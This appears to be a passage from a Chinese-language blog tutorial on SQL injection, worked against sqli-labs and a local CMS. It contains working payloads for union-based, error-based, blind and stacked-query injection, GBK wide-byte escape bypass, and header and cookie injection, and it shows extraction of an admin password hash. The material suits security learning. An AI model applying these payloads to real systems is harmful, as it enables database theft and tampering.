class="string">&quot;&lt;script&gt;alert(&#x27;用户名或密码不正确！&#x27;);window.history.go(-1)&lt;/script&gt;&quot;</span>); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="1-1-3-登录逻辑"><a href="#1-1-3-登录逻辑" class="headerlink" title="1.1.3  登录逻辑"></a><strong>1.1.3</strong>  <strong>登录逻辑</strong></h4><ul>
<li><p>通过POST 方式获取用户名和密码；</p>
</li>
<li><p>构造SQL 语句以用户名和密码作为查询条件进行查询，并且是单引号闭合；</p>
</li>
<li><p>如果SQL 语句正确执行并且结果集对象中有记录则提示登录成功；</p>
</li>
<li><p>否则，登录失败。</p>
</li>
</ul>
<h4 id="1-1-4-拼接问题"><a href="#1-1-4-拼接问题" class="headerlink" title="1.1.4  拼接问题"></a><strong>1.1.4</strong>  <strong>拼接问题</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select userid from cms_users where username = &#x27;&#123;用户名&#125;&#x27; and password=&#x27;&#123;md5(密码)&#125;&#x27;;</span><br><span class="line"></span><br><span class="line">select userid from cms_users where username = &#x27;777&#x27; or 1=1 #&#x27; and password=&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-2-SQL-注入总结"><a href="#1-2-SQL-注入总结" class="headerlink" title="1.2 SQL 注入总结"></a><strong>1.2</strong> <strong>SQL</strong> 注入总结</h3><h4 id="1-2-1-SQL-注入原理"><a href="#1-2-1-SQL-注入原理" class="headerlink" title="1.2.1  SQL 注入原理"></a><strong>1.2.1</strong>  <strong>SQL</strong> <strong>注入原理</strong></h4><p>​		SQL 注入的攻击行为可以描述为通过用户可控参数中注入SQL 语法，破坏原有SQL 结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的：</p>
<ul>
<li>程序员在处理程序和数据库交互时，使用字符串拼接的方式构造SQL 语句。</li>
<li>未对用户可控参数进行足够的过滤，便将参数内容拼接到SQL 语句中。</li>
</ul>
<h4 id="1-2-2-SQL-注入危害"><a href="#1-2-2-SQL-注入危害" class="headerlink" title="1.2.2  SQL 注入危害"></a>1.2.2  <strong>SQL</strong> <strong>注入危害</strong></h4><p>攻击者可以利用SQL 注入漏洞，可以获取数据库中的多种信息，例如，后台管理员账密，从而脱取数据库中的内容（脱库）。</p>
<p>在特别的情况下还可以插入内容到数据库、删除数据库中的内容或者修改数据库内容。</p>
<p>如果数据库权限分配存在问题，或者数据库本身存在缺陷，攻击者可以利用SQL 注入漏洞直接获取WebShell 或者服务器权限。</p>
<h4 id="1-2-3-SQL-注入分类"><a href="#1-2-3-SQL-注入分类" class="headerlink" title="1.2.3  SQL 注入分类"></a><strong>1.2.3</strong>  <strong>SQL</strong> <strong>注入分类</strong></h4><table>
<thead>
<tr>
<th align="center">两大基本类型</th>
<th align="center">五大基本手法</th>
<th>提交参数方式</th>
<th>注入点的位置</th>
</tr>
</thead>
<tbody><tr>
<td align="center"></td>
<td align="center"></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="1-3-SQL-注入漏洞挖掘"><a href="#1-3-SQL-注入漏洞挖掘" class="headerlink" title="**1.3 SQL 注入漏洞挖掘"></a>**1.3 <strong>SQL</strong> 注入漏洞挖掘</h3><h4 id="1-3-1-注入点判断"><a href="#1-3-1-注入点判断" class="headerlink" title="1.3.1  注入点判断"></a><strong>1.3.1</strong>  <strong>注入点判断</strong></h4><table>
<thead>
<tr>
<th>1</th>
<th>-1 或 +1</th>
<th>是否能够回显上一个或者下一个页面（判断是否有回显）</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>‘ 或 “</td>
<td>是否显示数据库错误信息；  根据回显内容可以判断是字符型数据还是数字型。</td>
</tr>
<tr>
<td>3</td>
<td>and 1&#x3D;1  and 1&#x3D;2</td>
<td>回显的页面是否不同（布尔类型的状态）</td>
</tr>
<tr>
<td>4</td>
<td>and sleep(5)</td>
<td>判断页面的返回时间</td>
</tr>
<tr>
<td>5</td>
<td>\</td>
<td>判断转义</td>
</tr>
</tbody></table>
<h4 id="1-3-2-主要关注的问题"><a href="#1-3-2-主要关注的问题" class="headerlink" title="1.3.2  主要关注的问题"></a><strong>1.3.2</strong>  <strong>主要关注的问题</strong></h4><table>
<thead>
<tr>
<th>回显</th>
<th>数据库中的内容是否会回显在网页中。</th>
</tr>
</thead>
<tbody><tr>
<td>数据库报错</td>
<td>数据库报错信息是否会回显在网页中。  提交的数据是字符型还是数字型，如果是字符型数据，闭合方式是什么？</td>
</tr>
<tr>
<td>布尔类型状态</td>
<td>显示的页面不同，形成对比。页面正常或者不正常。</td>
</tr>
<tr>
<td>延时</td>
<td>让数据库沉睡相应的秒数</td>
</tr>
</tbody></table>
<h4 id="1-3-3-CMS-注入点"><a href="#1-3-3-CMS-注入点" class="headerlink" title="1.3.3  CMS 注入点"></a><strong>1.3.3</strong>  <strong>CMS</strong> <strong>注入点</strong></h4><p><strong>是否有回显</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/cms/show.php?id=33 http://127.0.0.1/cms/show.php?id=32 http://127.0.0.1/cms/show.php?id=34</span><br><span class="line"></span><br><span class="line">#  有回显</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>是否有报错</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/cms/show.php?id=34&#x27;</span><br><span class="line"></span><br><span class="line"># near &#x27;&#x27;&#x27; at line 1</span><br><span class="line">#  中间的单引号才是SQL  语句的内容</span><br><span class="line"># select * from tb_name where id=34&#x27; #  34  没有出现在报错信息中，说明是数字型注入</span><br><span class="line"></span><br><span class="line">#  有报错</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>是否有布尔类型状态</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.10.10.128/cms/show.php?id=33+and+1=1 http://10.10.10.128/cms/show.php?id=33+and+1=2</span><br><span class="line"></span><br><span class="line">#  有布尔类型状态</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>是否有延时</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.10.10.128/cms/show.php?id=33+and+sleep(5)</span><br><span class="line"></span><br><span class="line">#  有延时</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-4-其他知识补充"><a href="#1-4-其他知识补充" class="headerlink" title="1.4 其他知识补充"></a><strong>1.4</strong> 其他知识补充</h3><h4 id="1-4-1-MySQL-数据库中的注释"><a href="#1-4-1-MySQL-数据库中的注释" class="headerlink" title="1.4.1  MySQL 数据库中的注释"></a><strong>1.4.1</strong>  <strong>MySQL</strong> <strong>数据库中的注释</strong></h4><table>
<thead>
<tr>
<th>减减空格（三个字符）【– 】</th>
<th>–+</th>
</tr>
</thead>
<tbody><tr>
<td>井号 【#】</td>
<td>%23</td>
</tr>
<tr>
<td>内联注释 &#x2F;<em>!5000 AJEST</em>&#x2F;</td>
<td></td>
</tr>
</tbody></table>
<h4 id="1-4-2-SQL-注入流程"><a href="#1-4-2-SQL-注入流程" class="headerlink" title="1.4.2  SQL 注入流程"></a><strong>1.4.2</strong>  <strong>SQL</strong> <strong>注入流程</strong></h4><p>库——》表——》列——》数据</p>
<h4 id="1-4-3-可以代替空格的字符"><a href="#1-4-3-可以代替空格的字符" class="headerlink" title="1.4.3  可以代替空格的字符"></a><strong>1.4.3</strong>  <strong>可以代替空格的字符</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;%0Aand%0A1=1%23 </span><br><span class="line">?id=1&#x27;%0Band%0B1=1%23 </span><br><span class="line">?id=1&#x27;%0Dand%0D1=2%23 </span><br><span class="line">?id=1&#x27;%A0and%A01=2%23</span><br></pre></td></tr></table></figure>

<h2 id="2-SQL-注入基本手法"><a href="#2-SQL-注入基本手法" class="headerlink" title="2.SQL 注入基本手法"></a>2.<strong>SQL</strong> 注入基本手法</h2><h3 id="2-1-联合查询"><a href="#2-1-联合查询" class="headerlink" title="2.1  联合查询"></a><strong>2.1</strong>  联合查询</h3><h4 id="2-1-1-必要条件"><a href="#2-1-1-必要条件" class="headerlink" title="2.1.1  必要条件"></a><strong>2.1.1</strong>  <strong>必要条件</strong></h4><ul>
<li><p>两条select 语句查询结果具有相同列数；</p>
</li>
<li><p>对应的列数据类型相同（特殊情况下，条件被放松）。</p>
</li>
</ul>
<h4 id="2-1-2-目标分析"><a href="#2-1-2-目标分析" class="headerlink" title="2.1.2 目标分析"></a>2.1.2 目标分析</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=32 ?id=33</span><br><span class="line">select * from tbName where id=32</span><br><span class="line">select * from tbName where id=32 union select ....</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-1-3-判断列数"><a href="#2-1-3-判断列数" class="headerlink" title="2.1.3 判断列数"></a>2.1.3 判断列数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=32 order by 1 </span><br><span class="line">?id=32 order by 2</span><br><span class="line">...</span><br><span class="line">?id=32 order by 15    正常</span><br><span class="line">?id=32 order by 16    不正常</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"># 当前select 语句中具有15 列。</span><br><span class="line"></span><br><span class="line">?id=32 union select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null</span><br><span class="line">?id=32 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-1-4-判断显示位置"><a href="#2-1-4-判断显示位置" class="headerlink" title="2.1.4  判断显示位置"></a><strong>2.1.4</strong>  <strong>判断显示位置</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">把第一条select 语句的查询条件置为假。</span><br><span class="line"></span><br><span class="line">?id=32 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 ?id=-32 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15</span><br><span class="line">?id=32 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p><strong>2.1.5</strong>  <strong>数据库中敏感信息</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=32 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,database(),12,13,14,15 ?id=32 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,version(),12,13,14,15 ?id=32 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,@@datadir,12,13,14,15 ?id=32 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,current_user(),12,13,14,15</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p><strong>2.1.6</strong>  <strong>获取管理员账密</strong></p>
<p><code>**数据库名**</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-33 UNION SELECT 1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15</span><br><span class="line"></span><br><span class="line">#  cms</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>**表名**</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-33 UNION SELECT 1,2,count(*),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line">?id=-33 UNION SELECT 1,2,hex(table_name),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables where table_schema=database() limit 0,1</span><br><span class="line"></span><br><span class="line">?id=-33 UNION SELECT 1,2,hex(table_name),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables where table_schema=database() limit 1,1</span><br><span class="line"></span><br><span class="line">?id=-33 UNION SELECT 1,2,hex(group_concat(table_name)),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line"># 636D735F61727469636C652C636D735F63617465676F72792C636D735F66696C652C636D735F667269656E646C696E6B2C636D735F6D6573 736167652C636D735F6E6F746963652C636D735F706167652C636D735F7573657273</span><br><span class="line"></span><br><span class="line"># cms_article,cms_category,cms_file,cms_friendlink,cms_message,cms_notice,cms_page,cms_users</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>**列名**</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-33 UNION SELECT 1,2,hex(group_concat(column_name)),4,5,6,7,8,9,10,11,12,13,14,15 from information_schema.columns where table_schema=database()   and table_name=&#x27;cms_users&#x27;</span><br><span class="line"></span><br><span class="line">#  7573657269642C757365726E616D652C70617373776F7264</span><br><span class="line"></span><br><span class="line"># userid,username,password</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>**数据**</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-33 UNION SELECT 1,2,hex(concat(username,0x3a,password)),4,5,6,7,8,9,10,11,12,13,14,15 from cms_users</span><br><span class="line"></span><br><span class="line">#  61646D696E3A6531306164633339343962613539616262653536653035376632306638383365</span><br><span class="line"></span><br><span class="line"># admin:e10adc3949ba59abbe56e057f20f883e # admin:123456</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-2-报错注入"><a href="#2-2-报错注入" class="headerlink" title="2.2 报错注入"></a>2.2 报错注入</h3><p>在注入点的判断过程中，发现数据库中SQL 语句的报错信息，会显示在页面中，因此可以利用报错信息进行注入。</p>
<p>报错注入的原理，在错误信息中执行SQL 语句。触发报错的方式有很多，具体细节也不尽相同。此处建议直接背公式，将公式带换掉 1&#x3D;1  的部分。</p>
<h4 id="2-2-1-group-by"><a href="#2-2-1-group-by" class="headerlink" title="2.2.1  group by"></a><strong>2.2.1</strong>  <a target="_blank" rel="noopener" href="https://bugs.mysql.com/bug.php?id=8652"><strong>group</strong> <strong>by</strong></a></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=33 and (select 1 from (select count(*),concat(0x5e,(select database()),0x5e,floor(rand()*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">?id=33 and (select 1 from (select count(*),concat(0x5e,(select password from cms_users limit 0,1),0x5e,floor(rand()*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-2-2-extractvalue"><a href="#2-2-2-extractvalue" class="headerlink" title="2.2.2  extractvalue"></a><strong>2.2.2</strong>  <strong>extractvalue</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=33 and extractvalue(1,concat(0x5e,(select database()),0x5e))</span><br><span class="line"></span><br><span class="line">?id=33 and extractvalue(1,concat(0x5e,substr((select password from cms_users),17,32),0x5e))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-2-3-updatexml"><a href="#2-2-3-updatexml" class="headerlink" title="2.2.3  updatexml"></a><strong>2.2.3</strong>  <strong>updatexml</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=33 and updatexml(1,concat(0x5e,(select database()),0x5e),1)</span><br><span class="line"></span><br><span class="line">?id=33 and updatexml(1,concat(0x5e,(select substr(password,1,16) from cms_users),0x5e),1)</span><br><span class="line"></span><br><span class="line">?id=33 and updatexml(1,concat(0x5e,(select substr(password,17,32) from cms_users),0x5e),1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-3-布尔盲注"><a href="#2-3-布尔盲注" class="headerlink" title="2.3 布尔盲注"></a><strong>2.3</strong> 布尔盲注</h3><p>页面中有布尔类型的状态，可以根据布尔类型状态，对数据库中的内容进行判断。</p>
<h4 id="2-3-1-库名爆破"><a href="#2-3-1-库名爆破" class="headerlink" title="2.3.1  库名爆破"></a><strong>2.3.1</strong>  <strong>库名爆破</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Less-8/?id=2&#x27; and database()=&#x27;xxx&#x27; --+ </span><br><span class="line">#  不知道数据库名有多少位</span><br><span class="line">#  不知道数据库名的字符集合</span><br><span class="line">#  爆破成本很高</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-3-2-库名长度"><a href="#2-3-2-库名长度" class="headerlink" title="2.3.2  库名长度"></a><strong>2.3.2</strong>  <strong>库名长度</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Less-8/?id=2&#x27; and length(database())=8 --+ </span><br><span class="line">#  页面正常，说明数据库名字的长度是8</span><br></pre></td></tr></table></figure>

<h4 id="2-3-3-按位测试"><a href="#2-3-3-按位测试" class="headerlink" title="2.3.3  按位测试"></a><strong>2.3.3</strong>  <strong>按位测试</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#  第一位</span><br><span class="line">/sqli-labs/Less-8/?id=2&#x27; and ascii(substr(database(),1,1))=115 --+ #  115</span><br><span class="line"># s</span><br><span class="line"></span><br><span class="line">/sqli-labs/Less-8/?id=2&#x27; and ascii(substr(database(),2,1))=101 --+ #  115	101</span><br><span class="line"># s	e</span><br><span class="line"></span><br><span class="line">#  第三位</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-4-延时注入"><a href="#2-4-延时注入" class="headerlink" title="2.4 延时注入"></a><strong>2.4</strong> 延时注入</h3><p>利用sleep() 语句的延时性，以时间线作为判断条件。</p>
<h4 id="2-4-1-数据库名字的长度"><a href="#2-4-1-数据库名字的长度" class="headerlink" title="2.4.1  数据库名字的长度"></a><strong>2.4.1</strong>  <strong>数据库名字的长度</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sqli-labs/Less-9/?id=2&#x27; and if(length(database())&gt;1,sleep(5),1) --+ </span><br><span class="line">#  页面有延时</span><br></pre></td></tr></table></figure>

<h4 id="2-4-2-数据库名字"><a href="#2-4-2-数据库名字" class="headerlink" title="2.4.2  数据库名字"></a><strong>2.4.2</strong>  <strong>数据库名字</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/sqli-labs/Less-9/?id=2&#x27; and if(substr(database(),3,1)=&#x27;c&#x27;,sleep(5),1) --+ </span><br><span class="line">#  115	101	99</span><br><span class="line">#   s	 e	 c</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-5-堆叠查询"><a href="#2-5-堆叠查询" class="headerlink" title="2.5 堆叠查询"></a><strong>2.5</strong> 堆叠查询</h3><p>一次HTTP 请求，可以同时执行多条SQL 语句，包括增删改查操作。</p>
<p>以sqli-labs 第38 关为例子。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&#x27;;update users set password=&#x27;123456&#x27;--+</span><br></pre></td></tr></table></figure>

<h2 id="3-SQL-注入其他情况"><a href="#3-SQL-注入其他情况" class="headerlink" title="3.SQL 注入其他情况"></a>3.<strong>SQL</strong> 注入其他情况</h2><h3 id="3-1-宽字节注入"><a href="#3-1-宽字节注入" class="headerlink" title="3.1 宽字节注入"></a><strong>3.1</strong> 宽字节注入</h3><p>宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。宽字节注入的目的是绕过单双引号转义，以sqli-labs-32 关为例子。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 </span><br><span class="line">?id=1&#x27; </span><br><span class="line">1\&#x27;        服务器会把单引号转义，单引号由原来的定义字符  串的特殊字符被转义为普通字符。</span><br><span class="line">315c27     非常强烈的暗示</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3-1-1-代码分析"><a href="#3-1-1-代码分析" class="headerlink" title="3.1.1  代码分析"></a><strong>3.1.1</strong>  <strong>代码分析</strong></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>); backslash</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>); backslash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$string</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables if(isset($_GET[&#x27;id&#x27;])) &#123;</span></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">check_addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="comment">//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>); <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>); <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>单双引号被转义，没有其他过滤；</p>
</li>
<li><p>将与数据库交互的数据字符编码设置为了GBK。</p>
</li>
</ul>
<h4 id="3-1-2-GBK-编码"><a href="#3-1-2-GBK-编码" class="headerlink" title="3.1.2  GBK 编码"></a><strong>3.1.2</strong>  <strong>GBK</strong> <strong>编码</strong></h4><p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php">GBK 汉字编码方案</a>，双字节编码，两个字节作为一个汉字。GBK 编码范围[8140,FEFE]，可以通过<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zifuji.php">汉字字符集编码</a>查询。注意到5C 在GBK 编码的低位范围之内[40,FE]。在5C 之前添加一个字符[81,FE] 之间，该字符就会和5c 组成一个汉字。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/sql%E6%B3%A8%E5%85%A5.assets/image-20230822224203047.png" alt="image-20230822224203047"></p>
<h4 id="3-1-3-宽字节注入"><a href="#3-1-3-宽字节注入" class="headerlink" title="3.1.3 宽字节注入"></a>3.1.3 宽字节注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cb5c ?id=1         薥</span><br><span class="line">%cb&#x27; </span><br><span class="line">1%df\&#x27; </span><br><span class="line">31cb5c27 </span><br><span class="line">1薥&#x27;               # “吃”掉了转义字符\</span><br><span class="line"> </span><br><span class="line">/Less-32/?id=1%cb&#x27; and 1=2 union select 1,database(),3 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-2-HTTP-头部注入"><a href="#3-2-HTTP-头部注入" class="headerlink" title="3.2 HTTP 头部注入"></a><strong>3.2</strong> <strong>HTTP</strong> 头部注入</h3><p>SQL 注入点不止会出现在GET 参数或POST 参数中。</p>
<h4 id="3-2-1-Cookie-注入"><a href="#3-2-1-Cookie-注入" class="headerlink" title="3.2.1  Cookie 注入"></a><strong>3.2.1</strong>  <strong>Cookie</strong> <strong>注入</strong></h4><p>注入点在Cookie 数据中，以sqli-labs-20 关为例子</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /sqli-labs/Less-20/index.php HTTP/1.1 </span><br><span class="line">Host: 10.4.7.128</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://10.4.7.128/sqli-labs/Less-20/</span><br><span class="line">DNT:  1 Connection: close</span><br><span class="line">Cookie: <span class="built_in">uname</span>=Dumb<span class="string">&#x27; and 1=2 union select 1,version(),database() # Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<h4 id="3-2-2-base64-注入"><a href="#3-2-2-base64-注入" class="headerlink" title="3.2.2  base64 注入"></a><strong>3.2.2</strong>  <strong>base64</strong> <strong>注入</strong></h4><p>注入的参数需要进行base64 编码，以sqli-labs-22 关为例子。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">GET /sqli-labs/Less-22/index.php HTTP/1.1 </span><br><span class="line">Host: 10.4.7.128</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 </span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://10.4.7.128/sqli-labs/Less-22/</span><br><span class="line">DNT:  1 Connection: close</span><br><span class="line">Cookie:<span class="built_in">uname</span>=RHVtYiIgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSx2ZXJzaW9uKCksZGF0YWJhc2UoKSM= Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3-2-3-User-Agent-注入"><a href="#3-2-3-User-Agent-注入" class="headerlink" title="3.2.3 User-Agent 注入"></a>3.2.3 <strong>User-Agent</strong> <strong>注入</strong></h4><p>注入的参数在User-Agent 中，以sqli-labs-18 关为例子。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">POST /sqli-labs/Less-18/ HTTP/1.1 </span><br><span class="line">Host: 10.4.7.128</span><br><span class="line">User-Agent: AJEST<span class="string">&#x27; and updatexml(1,concat(0x5e,(select database()),0x5e),1) and &#x27;</span>1 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 </span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded Content-Length: 36</span><br><span class="line">Origin: http://10.4.7.128 DNT:  1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.4.7.128/sqli-labs/Less-18/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">uname</span>=Dumb&amp;passwd=Dumb&amp;submit=Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3-2-4-Referer-注入"><a href="#3-2-4-Referer-注入" class="headerlink" title="3.2.4  Referer 注入"></a><strong>3.2.4</strong>  <strong>Referer</strong> <strong>注入</strong></h4><p>注入参数在Referer 字段中，以sqli-labs-19 关为例子。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">POST /sqli-labs/Less-19/ HTTP/1.1 </span><br><span class="line">Host: 10.4.7.128</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 </span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded Content-Length: 36</span><br><span class="line">Origin: http://10.4.7.128 DNT:  1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: AJEST<span class="string">&#x27; and updatexml(1,concat(0x5e,(select database()),0x5e),1) and &#x27;</span>1 </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">uname</span>=Dumb&amp;passwd=Dumb&amp;submit=Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>

